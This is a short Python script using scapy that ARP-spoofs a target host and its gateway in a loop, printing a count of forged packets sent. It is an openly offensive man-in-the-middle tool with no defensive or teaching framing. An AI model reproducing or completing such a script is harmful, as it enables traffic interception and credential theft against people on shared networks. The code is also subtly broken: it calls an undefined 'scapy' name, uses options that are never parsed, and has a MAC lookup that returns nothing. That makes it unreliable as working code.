#!python3
from socket import timeout
import scapy.all as sc
import sys,argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target-ip",dest="tarIP",help="Enter a target IP.")
    parser.add_argument("-g","--gatway-ip",dest="tarGatway",help="Enter a gatway IP.")
    options = parser.parse_args()
    return options

# reference code:
# https://www.programcreek.com/python/example/103593/scapy.all.srp
class fc:
        rw = '\033[31;107m'
        r = '\033[38;5;196m'
        pink_violet = '\033[38;5;206;48;5;57m'
        end = '\033[0m'
        pink = '\033[38;5;206m'
        yellow = '\033[0;33;40m'
        purple = '\033[0;35m'
        cyan = '\033[36m'
        g = '\033[38;5;154m'
        b = '\033[38;5;45m'
def getMac(ip):
    ar = scapy.ARP(pdst=ip)
    bc = scapy.Ether(dst  = 'ff:ff:ff:ff:ff:ff')
    arbc = bc/ar
    al = scapy.srp(arbc,timeout=1)#try without this first to see full list//[0]//#could use srp1- only returns the first answer
    print(al)
    #return answered_list[0][1].hwsrc   // should be single result for the scan program 

def spoof(targetIP,spoofIP):
    targetMac = getMac(targetIP)
    pkt = scapy.ARP(op=2, pdst = targetIP, hwdst = targetMac, psrc = spoofIP)
    sc.send(pkt)
pktCounter = 0 
try:
    while True:
        spoof(opt.tarIP,opt.tarGatway)
        spoof(opt.tarGatway,opt.tarIP)
        pktCounter = pktCounter + 2
        print(f'\r{fc.pink_violet}[+]{fc.end} {fc.b}Packets sent: {pktCounter}{fc.end}',end='')
except Exception as e:
    print(f'\tError: {fc.rw}{e}{fc.end}')
    sys.exit()


except KeyboardInterrupt:
    print('Abort')

